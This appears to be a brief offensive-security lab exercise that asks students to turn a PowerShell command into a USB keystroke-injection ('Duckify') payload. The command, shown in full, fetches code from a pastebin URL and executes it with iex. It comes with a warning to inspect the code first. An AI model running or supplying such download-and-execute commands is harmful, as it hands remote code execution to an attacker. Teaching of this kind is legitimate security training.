In our labs, we sent data to pastebin. But what if we used pastebin (or github) to host our malicious code?!
Duckify this powershell command:
```powershell
iex((iwr http://pastebin.com/raw.php?i=sWacjDpa).content)
```
But before you do. 

PLEASE LOOK AT THE CODE AND UNDERSTAND IT!

Always be vigilant!
